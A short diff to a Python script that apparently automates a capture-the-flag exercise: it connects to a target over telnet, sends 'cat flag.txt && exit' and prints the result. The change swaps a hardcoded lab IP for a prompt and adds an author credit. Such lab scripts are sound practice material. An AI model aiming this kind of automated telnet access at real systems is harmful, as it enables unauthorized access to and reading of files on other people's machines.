@@ -1,7 +1,7 @@
 import telnetlib # Imports
 import info
 import sys
-HOST = "10.129.1.17" #input("Enter your host IP: ") # Where you enter the IP of the machine
+HOST = input("Enter your host IP: ") # Where you enter the IP of the machine
 PORT = "23" # Default Telnet port
 print(info.headermessage) # Prints the "GeckScript message"
 print(info.meowmessage)
@@ -12,3 +12,4 @@ tn.read_until(b"snap") # Reads until the "snap" folder, cleans up the output, re
 tn.write(b'cat flag.txt && exit\n')
 x = tn.read_all()
 print(x)
+## Dr-Gecko 2022
